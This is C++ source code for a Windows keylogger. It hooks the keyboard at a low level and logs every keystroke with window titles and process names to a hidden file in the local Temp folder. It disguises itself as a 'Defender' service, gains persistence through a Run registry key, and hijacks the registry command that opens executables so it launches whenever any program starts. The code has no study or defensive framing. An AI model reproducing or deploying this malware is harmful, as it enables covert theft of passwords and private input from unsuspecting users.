// SetWindowsHookEx-Keylogger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include <Shlobj.h>
#include <psapi.h>

#include "time.h"
#include "string" 
#include <sstream>
#include <fstream>
#include <iostream>
#include <chrono>

// C:\ > sc create "Defender Service" binPath="C:\...\SetWindowsHookEx-Keylogger.exe -service"
// C:\>sc delete "Defender Service"

// KeyBoard hook handle in global scope
HHOOK KeyboardHook;
// Shift Key 
bool shift = FALSE;
// Windows Title Text -260 char-
CHAR cWindow[1000];
// NULL is ok
HWND lastWindow = NULL;
// File Path
std::wstring fileName = L"C:\\test.txt";

std::string HookCode(DWORD code, BOOL caps, BOOL shift)
{
	//std::cout << "code=" << code << ",shift=" << shift << ",caps=" << caps << std::endl;

	/*
	Translate the return code from hook and 
	return the std::string rep of the the code.
	ex. 0x88 -> "[SHIFT]"
	caps = Caps lock on
	shift = Shift key pressed
	WinUser.h = define statments
	LINK = https://msdn.microsoft.com/en-us/library/dd375731(v=VS.85).aspx
	*/
	std::string key;
	switch (code) // SWITCH ON INT
	{
		// Char keys for ASCI
		// No VM Def in header 
		case 0x41: key = caps ? (shift ? "a" : "A") : (shift ? "A" : "a"); break;
		case 0x42: key = caps ? (shift ? "b" : "B") : (shift ? "B" : "b"); break;
		case 0x43: key = caps ? (shift ? "c" : "C") : (shift ? "C" : "c"); break;
		case 0x44: key = caps ? (shift ? "d" : "D") : (shift ? "D" : "d"); break;
		case 0x45: key = caps ? (shift ? "e" : "E") : (shift ? "E" : "e"); break;
		case 0x46: key = caps ? (shift ? "f" : "F") : (shift ? "F" : "f"); break;
		case 0x47: key = caps ? (shift ? "g" : "G") : (shift ? "G" : "g"); break;
		case 0x48: key = caps ? (shift ? "h" : "H") : (shift ? "H" : "h"); break;
		case 0x49: key = caps ? (shift ? "i" : "I") : (shift ? "I" : "i"); break;
		case 0x4A: key = caps ? (shift ? "j" : "J") : (shift ? "J" : "j"); break;
		case 0x4B: key = caps ? (shift ? "k" : "K") : (shift ? "K" : "k"); break;
		case 0x4C: key = caps ? (shift ? "l" : "L") : (shift ? "L" : "l"); break;
		case 0x4D: key = caps ? (shift ? "m" : "M") : (shift ? "M" : "m"); break;
		case 0x4E: key = caps ? (shift ? "n" : "N") : (shift ? "N" : "n"); break;
		case 0x4F: key = caps ? (shift ? "o" : "O") : (shift ? "O" : "o"); break;
		case 0x50: key = caps ? (shift ? "p" : "P") : (shift ? "P" : "p"); break;
		case 0x51: key = caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q"); break;
		case 0x52: key = caps ? (shift ? "r" : "R") : (shift ? "R" : "r"); break;
		case 0x53: key = caps ? (shift ? "s" : "S") : (shift ? "S" : "s"); break;
		case 0x54: key = caps ? (shift ? "t" : "T") : (shift ? "T" : "t"); break;
		case 0x55: key = caps ? (shift ? "u" : "U") : (shift ? "U" : "u"); break;
		case 0x56: key = caps ? (shift ? "v" : "V") : (shift ? "V" : "v"); break;
		case 0x57: key = caps ? (shift ? "w" : "W") : (shift ? "W" : "w"); break;
		case 0x58: key = caps ? (shift ? "x" : "X") : (shift ? "X" : "x"); break;
		case 0x59: key = caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y"); break;
		case 0x5A: key = caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z"); break;
		// Sleep Key
		case VK_SLEEP: key = "[SLEEP]"; break;
		// Num Keyboard 
		case VK_NUMPAD0:  key = "0"; std::cout << "VK_NUMPAD0" << std::endl; break;
		case VK_NUMPAD1:  key = "1"; std::cout << "VK_NUMPAD1" << std::endl; break;
		case VK_NUMPAD2 : key = "2"; break;
		case VK_NUMPAD3:  key = "3"; break;
		case VK_NUMPAD4:  key = "4"; break;
		case VK_NUMPAD5:  key = "5"; break;
		case VK_NUMPAD6:  key = "6"; break;
		case VK_NUMPAD7:  key = "7"; break;
		case VK_NUMPAD8:  key = "8"; break;
		case VK_NUMPAD9:  key = "9"; break;
		case VK_MULTIPLY: key = "*"; break;
		case VK_ADD:      key = "+"; break;
		case VK_SEPARATOR: key = "-"; break;
		case VK_SUBTRACT: key = "-"; break;
		case VK_DECIMAL:  key = "."; break;
		case VK_DIVIDE:   key = "/"; break;
		// Function Keys
		case VK_F1:  key = "[F1]"; break;
		case VK_F2:  key = "[F2]"; break;
		case VK_F3:  key = "[F3]"; break;
		case VK_F4:  key = "[F4]"; break;
		case VK_F5:  key = "[F5]"; break;
		case VK_F6:  key = "[F6]"; break;
		case VK_F7:  key = "[F7]"; break;
		case VK_F8:  key = "[F8]"; break;
		case VK_F9:  key = "[F9]"; break;
		case VK_F10:  key = "[F10]"; break;
		case VK_F11:  key = "[F11]"; break;
		case VK_F12:  key = "[F12]"; break;
		case VK_F13:  key = "[F13]"; break;
		case VK_F14:  key = "[F14]"; break;
		case VK_F15:  key = "[F15]"; break;
		case VK_F16:  key = "[F16]"; break;
		case VK_F17:  key = "[F17]"; break;
		case VK_F18:  key = "[F18]"; break;
		case VK_F19:  key = "[F19]"; break;
		case VK_F20:  key = "[F20]"; break;
		case VK_F21:  key = "[F22]"; break;
		case VK_F22:  key = "[F23]"; break;
		case VK_F23:  key = "[F24]"; break;
		case VK_F24:  key = "[F25]"; break;
		// Keys
		case VK_NUMLOCK: key = "[NUM-LOCK]"; break;
		case VK_SCROLL:  key = "[SCROLL-LOCK]"; break;
		case VK_BACK:    key = "[BACK]"; break;
		case VK_TAB:     key = "[TAB]"; break;
		case VK_CLEAR:   key = "[CLEAR]"; break;
		case VK_RETURN:  key = "[ENTER]"; break;
		case VK_SHIFT:   key = "[SHIFT]"; break;
		case VK_CONTROL: key = "[CTRL]"; break;
		case VK_MENU:    key = "[ALT]"; break;
		case VK_PAUSE:   key = "[PAUSE]"; break;
		case VK_CAPITAL: key = "[CAP-LOCK]"; break;
		case VK_ESCAPE:  key = "[ESC]"; break;
		case VK_SPACE:   key = "[SPACE]"; break;
		case VK_PRIOR:   key = "[PAGEUP]"; break;
		case VK_NEXT:    key = "[PAGEDOWN]"; break;
		case VK_END:     key = "[END]"; break;
		case VK_HOME:    key = "[HOME]"; break;
		case VK_LEFT:    key = "[LEFT]"; break;
		case VK_UP:      key = "[UP]"; break;
		case VK_RIGHT:   key = "[RIGHT]"; break;
		case VK_DOWN:    key = "[DOWN]"; break;
		case VK_SELECT:  key = "[SELECT]"; break;
		case VK_PRINT:   key = "[PRINT]"; break;
		case VK_SNAPSHOT: key = "[PRTSCRN]"; break;
		case VK_INSERT:  key = "[INS]"; break;
		case VK_DELETE:  key = "[DEL]"; break;
		case VK_HELP:    key = "[HELP]"; break;
		// Number Keys with shift
		case 0x30:  key = shift ? ")" : "0"; break;
		case 0x31:  key = shift ? "!" : "1"; break;
		case 0x32:  key = shift ? "@" : "2"; break;
		case 0x33:  key = shift ? "#" : "3"; break;
		case 0x34:  key = shift ? "$" : "4"; break;
		case 0x35:  key = shift ? "%" : "5"; break;
		case 0x36:  key = shift ? "^" : "6"; break;
		case 0x37:  key = shift ? "&" : "7"; break;
		case 0x38:  key = shift ? "*" : "8"; break;
		case 0x39:  key = shift ? "(" : "9"; break;
		// Windows Keys
		case VK_LWIN:     key = "[WIN]"; break;
		case VK_RWIN:     key = "[WIN]"; break;
		case VK_LSHIFT:   key = "[SHIFT]"; break;
		case VK_RSHIFT:   key = "[SHIFT]"; break;
		case VK_LCONTROL: key = "[CTRL]"; break;
		case VK_RCONTROL: key = "[CTRL]"; break;
		// OEM Keys with shift 
		case VK_OEM_1:      key = shift ? ":" : ";"; break;
		case VK_OEM_PLUS:   key = shift ? "+" : "="; break;
		case VK_OEM_COMMA:  key = shift ? "<" : ","; break; 
		case VK_OEM_MINUS:  key = shift ? "_" : "-"; break;
		case VK_OEM_PERIOD: key = shift ? ">" : "."; break;
		case VK_OEM_2:      key = shift ? "?" : "/"; break;
		case VK_OEM_3:      key = shift ? "~" : "`"; break;
		case VK_OEM_4:      key = shift ? "{" : "["; break;
		case VK_OEM_5:      key = shift ? "\\" : "|"; break;
		case VK_OEM_6:      key = shift ? "}" : "]"; break;
		case VK_OEM_7:      key = shift ? "'" : "'"; break; //TODO: Escape this char: "
		// Action Keys
		case VK_PLAY:       key = "[PLAY]";
		case VK_ZOOM:       key = "[ZOOM]";
		case VK_OEM_CLEAR:  key = "[CLEAR]";
		case VK_CANCEL:     key = "[CTRL-C]";

		default: 
			std::stringstream ss;
			ss << "0x" << std::hex << code;
			key = "[UNK-KEY]" + ss.str();
			break;
	}
	return key;

}

std::string Dayofweek(int code)
{
	// Return Day of the year in text
	std::string name;
	switch (code)
	{
		case 0: name = "[SUNDAY]"; break;
		case 1: name = "[MONDAY]"; break;
		case 2: name = "[TUESDAY]"; break;
		case 3: name = "[WENSDAY]"; break;
		case 4: name = "[THURSDAY]"; break;
		case 5: name = "[FRIDAY]"; break;
		case 6: name = "[SATURDAY]"; break;
		default:
			name = "[UNKOWN]";
	}
	return name;
}

class My {
public:
	static void Debug(std::string string) {
		string += "\n";

		OutputDebugStringA(string.c_str());
		std::cout << string.c_str();
	}

	static std::string GetProcessFileName(DWORD dwProcId)
	{
		CHAR moduleName[2048] = { 0 };
		HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcId);
		GetModuleFileNameExA((HMODULE)hProc, NULL, moduleName, sizeof(moduleName) / sizeof(WCHAR));
		CloseHandle(hProc);

		return std::string(moduleName);
	}

	static std::string GetWindowFileName(HWND hwnd) {
		DWORD dwProcId = 0;
		GetWindowThreadProcessId(hwnd, &dwProcId);
		std::string moduleName = GetProcessFileName(dwProcId);

		Debug((std::string("moduleName = ") + moduleName).c_str());

		return std::string("(") + std::to_string(dwProcId) + ") , " + moduleName;
	}
	 
	static bool Test() {
		//GetWindowFileName(GetForegroundWindow());

		//return true;
		return false;
	}

	static bool RunProcess(LPSTR lpCmdLine) {
		if (lstrlenA(lpCmdLine) == 0)
		{
			My::Debug("RunProcess: Nothing to run");
			return false;
		}
		
		STARTUPINFOA si;
		PROCESS_INFORMATION pi;

		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));

		// Start the child process. 
		if (!CreateProcessA(
			NULL,           // No module name (use command line)
			lpCmdLine,      // Command line
			NULL,           // Process handle not inheritable
			NULL,           // Thread handle not inheritable
			FALSE,          // Set handle inheritance to FALSE
			0,              // No creation flags
			NULL,           // Use parent's environment block
			NULL,           // Use parent's starting directory 
			&si,            // Pointer to STARTUPINFO structure
			&pi             // Pointer to PROCESS_INFORMATION structure
		))
		{
			My::Debug("RunProcess: CreateProcess failed" + std::to_string(GetLastError()));
			return false;
		}

		// Close process and thread handles. 
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		return true;
	}
		
	static bool UpdateRegistration(LPSTR lpCmdLine) {
		DWORD ret;
		HKEY hkey = NULL;

		std::string cmdLine(lpCmdLine);

		if (ERROR_SUCCESS == RegOpenKeyExA(HKEY_CLASSES_ROOT, "exefile\\shell\\open\\command", 0, KEY_READ | KEY_WRITE, &hkey))
		{
			const CHAR* cOrgValueName = "Default_Org";
			const CHAR* cRunValueName = "Defender";
			const CHAR* cDefaultValueName = /*NULL*/"Default_";

			LONG res = 0;
			DWORD dataType = REG_NONE;
			ULONG ucbValue = 0;

			if (std::string::npos != cmdLine.find("-register"))
			{
				if (ERROR_SUCCESS == RegQueryValueExA(hkey, cDefaultValueName, NULL, &dataType, NULL, &ucbValue))
				{
					std::string strValue;
					strValue.resize(ucbValue / sizeof(CHAR));

					if (ERROR_SUCCESS == RegQueryValueExA(hkey, cDefaultValueName, NULL, &dataType, (LPBYTE)&strValue.front(), &ucbValue))
					{
						ULONG ucbOrgValue = 0;

						//RegSetValueExA(hkey, NULL /*Default*/, NULL,  /*dataType*/REG_SZ, (LPBYTE)"\"%1\" %*", ucbValue);

						std::string moduleName = "\"" + GetProcessFileName(GetCurrentProcessId()) + "\"";

						// Re-entrancy check
						DWORD dataTypeTmp = REG_NONE;
						if (ERROR_SUCCESS != RegQueryValueExA(hkey, cOrgValueName, NULL, &dataTypeTmp, NULL, &ucbOrgValue))
						{
							// 0. Set Original Value
							RegSetValueExA(hkey, cOrgValueName, NULL, /*dataType*/REG_SZ, (LPBYTE)strValue.c_str(), strValue.length() * sizeof(CHAR));

							// 2. Add into front of the value
							strValue = moduleName + " " + strValue;

							// 3. Set Value
							LPBYTE lpbyte = (LPBYTE)strValue.c_str();
							ucbValue = (strValue.length()) * sizeof(CHAR);
							RegSetValueExA(hkey, cDefaultValueName, NULL,  /*dataType*/REG_SZ, lpbyte, ucbValue);
						}

						HKEY hkeyRun = NULL;
						if (ERROR_SUCCESS == RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE, &hkeyRun))
						{
							RegSetValueExA(hkeyRun, cRunValueName, NULL, REG_SZ, (LPBYTE)moduleName.c_str(), moduleName.length() * sizeof(CHAR));

							RegCloseKey(hkeyRun);
							hkeyRun = NULL;
						}
					}
				}
			}
			else
				//if (std::string::npos != cmdLine.find("-unregister"))
			{
				std::string strOrgValue;
				ULONG ucbOrgValue = 0;
				// 1. Read original value
				if (ERROR_SUCCESS == RegQueryValueExA(hkey, cOrgValueName, NULL, &dataType, NULL, &ucbOrgValue))
				{
					strOrgValue.resize(ucbOrgValue / sizeof(CHAR));

					if (ERROR_SUCCESS == RegQueryValueExA(hkey, cOrgValueName, NULL, &dataType, (LPBYTE)&strOrgValue.front(), &ucbOrgValue))
					{
						// 2. Set original value
						RegSetValueExA(hkey, cDefaultValueName, NULL, dataType, (LPBYTE)strOrgValue.c_str(), strOrgValue.length() * sizeof(CHAR));

						RegDeleteValueA(hkey, cOrgValueName);
					}
				}
			}

			RegCloseKey(hkey);
			hkey = NULL;
		}

		return true;
	}



	static bool Service(LPSTR lpCmdLine) {
		std::string cmdLine(lpCmdLine);

		if (std::string::npos != cmdLine.find("-service"))
		{
			Debug("Service: Calling SampleServiceMain");
			SampleServiceMain(0, NULL);
			return true;
		}

		return false;
	}

};

boolean HookKeyboard()
{
	My::Debug("HookKeyboard:==>");

	PWSTR pwstrAppData = NULL;

	HRESULT hr = SHGetKnownFolderPath(
		FOLDERID_LocalAppData/*FOLDERID_AppDataProgramData*/,
		0,
		NULL,
		&pwstrAppData
	);

	if (hr != S_OK)
	{
		My::Debug(std::string("SHGetKnownFolderPath failed with ") + std::to_string(hr));
		return false;
	}

	long long timestamp = std::chrono::system_clock::now().time_since_epoch().count() / 1000000;
	fileName = std::wstring(pwstrAppData) + L"\\Temp\\kl" + std::to_wstring(timestamp) + L".bin";

	if (pwstrAppData) {
		CoTaskMemFree(pwstrAppData);
		pwstrAppData = NULL;
	}

	KeyboardHook = SetWindowsHookEx(
		WH_KEYBOARD_LL, // low-level keyboard input events
		HookProcedure, // pointer to the hook procedure
		GetModuleHandle(NULL), // A handle to the DLL containing the hook procedure 
		NULL //desktop apps, if this parameter is zero
	);
	if (!KeyboardHook) {
		// Hook returned NULL and failed
		My::Debug("HookKeyboard: Failed to get handle from SetWindowsHookEx()\n");
	}

	My::Debug("HookKeyboard:<--");
	return KeyboardHook != 0;
}

void UnhookKeyboard()
{
	My::Debug(std::string("UnhookKeyboard:==> KeyboardHook=") + std::to_string((long)KeyboardHook));
	UnhookWindowsHookEx(KeyboardHook);
	My::Debug("UnhookKeyboard:<--");
}

LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
{
	/*
	SHORT WINAPI GetKeyState(
		_In_ int nVirtKeydasdsad
		);
	*/

	/* 
	WH_KEYBOARD_LL uses the LowLevelKeyboardProc Call Back
	LINK = https://msdn.microsoft.com/en-us/library/windows/desktop/ms644985(v=vs.85).aspx
	*/
	// LowLevelKeyboardProc Structure 
	/*
	typedef struct tagKBDLLHOOKSTRUCT {
		DWORD     vkCode;
		DWORD     scanCode;
		DWORD     flags;
		DWORD     time;
		ULONG_PTR dwExtraInfo;
		} KBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT, *LPKBDLLHOOKSTRUCT;
	*/
	KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
	// Do the wParam and lParam parameters contain information about a keyboard message.
	if (nCode == HC_ACTION)
	{
		std::ofstream myfile(fileName, std::ios::out | std::ios::app | std::ios::binary);
		bool caps = FALSE;		SHORT capsShort = GetKeyState(VK_CAPITAL);
		std::string outPut;
		std::stringstream temp;
		if (capsShort > 0)
		{
			// If the high-order b2it is 1, the key is down; otherwise, it is up
			caps = TRUE;
		}

		// Messsage data is ready for pickup
		// Check for SHIFT key
		if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT)
		{
			//std::cout << "wParam=" << wParam << std::endl;

			// WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, or WM_SYSKEYUP.
			if (wParam == WM_KEYDOWN)
			{
				//std::cout << "shift DOWN" << std::endl;
				shift = TRUE;
			}
			else 
			if (wParam == WM_KEYUP)
			{
				//std::cout << "shift UP" << std::endl;
				shift = FALSE;
			}
			else
			{
				std::cout << "wParam shift UP" << std::endl;
				shift = FALSE;
			}
		}
		// Start Loging keys now we are setup
		if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
		{
			// Retrieves a handle to the foreground window (the window with which the user is currently working).
			HWND currentWindow = GetForegroundWindow();
			// Check if we need to write new window output
			if (currentWindow != lastWindow)
			{
				/*
				void WINAPI GetLocalTime(
					  _Out_ LPSYSTEMTIME lpSystemTime
					);
				typedef struct _SYSTEMTIME {
					WORD wYear;
					WORD wMonth;
					WORD wDayOfWeek;
					WORD wDay;
					WORD wHour;
					WORD wMinute;
					WORD wSecond;
					WORD wMilliseconds;
					} SYSTEMTIME, *PSYSTEMTIME;
				*/
				//LPSYSTEMTIME t;
				SYSTEMTIME t;
				GetLocalTime(&t);
				int day = t.wDay;
				int month = t.wMonth;
				int year = t.wYear;
				int hour = t.wHour;
				int min = t.wMinute;
				int sec = t.wSecond;
				int dayName = t.wDayOfWeek;
				// Build our output header
				temp << "\n\n[+] " << Dayofweek(dayName) << " - " << day << "/" << month << "/" << year << "  ";
				temp << hour << ":" << min << ":" << sec;
				outPut.append(temp.str());
				temp.clear();
				/*
				int WINAPI GetWindowText(
				  _In_  HWND   hWnd,
				  _Out_ LPTSTR lpString,
				  _In_  int    nMaxCount
				);
				*/

				HWND hwnd = GetForegroundWindow();
				int c = GetWindowTextA(hwnd, cWindow, sizeof(cWindow));
				std::cout << c;

				std::string moduleName = My::GetWindowFileName(hwnd);

				temp << " - Current Window: " << cWindow << "\n";
				temp << " - Current Process: " << moduleName << "\n\n";

				//outPut.append(temp.str());
				std::cout << temp.str() << std::endl;
				myfile << temp.str() << std::endl;
				// Setup for next CallBack
				lastWindow = currentWindow;
			}

			// Now capture keys
			if (p->vkCode)
			{
				//outPut.append(HookCode(p->vkCode, caps, shift));
				temp.clear();
				temp << HookCode(p->vkCode, caps, shift);
				std::cout << temp.str();
				myfile << temp.str();
				if (p->vkCode == VK_RETURN)
				{
					myfile << std::endl;
				}
			}
			// Final output logic
		}

		myfile.close();

	}
	// hook procedure must pass the message *Always*
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nShowCmd
)
{
	static char szUniqueNamedMutex[] = "com.defender.IsRunning";

	My::Debug(std::string("WinMain: lpCmdLine=") + lpCmdLine + "\n");

	std::string strCmdLine(lpCmdLine);
	if (strCmdLine.find("Defender") == std::string::npos && strCmdLine.find("Keylogger") == std::string::npos) {
		My::RunProcess(lpCmdLine);
	}

	if (My::UpdateRegistration(lpCmdLine))
	{
		return 0;
	}

	if (My::Test()) {
		return 0;
	}

	if (My::Service(lpCmdLine)) {
		return 0;
	}

	PasswordRun(lpCmdLine);

	std::cout << "[*] Starting KeyCapture" << std::endl;
	/*
	HHOOK WINAPI SetWindowsHookEx(
	  _In_ int       idHook,
	  _In_ HOOKPROC  lpfn,
	  _In_ HINSTANCE hMod,
	  _In_ DWORD     dwThreadId
	);
	*/
	// Start the hook of the keyboard
	SetLastError(0);
	HANDLE hHandle = CreateMutexA(NULL, TRUE, szUniqueNamedMutex);
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		My::Debug("WinMain: Already running!!!");

		return 0;
	}
	else
	{
		if (HookKeyboard()) {
			My::Debug("WinMain: Setting up hook");
			// http://www.winprog.org/tutorial/message_loop.html
			MSG Msg;
			while (GetMessage(&Msg, NULL, 0, 0) > 0)
			{
				TranslateMessage(&Msg);
				DispatchMessage(&Msg);
			}
		}
		UnhookKeyboard();
	}

	ReleaseMutex(hHandle);
	CloseHandle(hHandle);
	hHandle = 0;

	// Exit if failure
    return 0;
}

